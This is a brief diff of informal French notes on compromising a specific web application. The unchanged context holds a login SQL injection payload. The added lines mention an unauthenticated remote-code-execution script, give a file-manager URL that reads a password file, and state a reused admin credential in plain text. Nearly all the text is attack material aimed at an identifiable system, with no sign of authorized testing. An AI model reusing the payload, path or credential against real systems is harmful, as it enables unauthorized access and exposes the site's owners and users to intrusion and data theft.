@@ -5,7 +5,12 @@ j'aurais pas du me lever un dimanche matin...
 
 sqli sur le login : admin' OR 1=1--
 
-puis bon full unauth rce system..
+puis bon full unauth rce system.. (cf atk.sh)
 
+htpasswd dispo là si jamais : /map/admin/codes/ged/news/index.php?action=3&fm_current_dir=c%3A%2Fwamp%2Fwww%2Fubipartages%5Cuser%5C&filename=user.passwd
+mais c'est le meme partout.. admin:1984
 
+tpe lire et ecrire partout..
+
+fin ya rien qui va quoi.. 
 
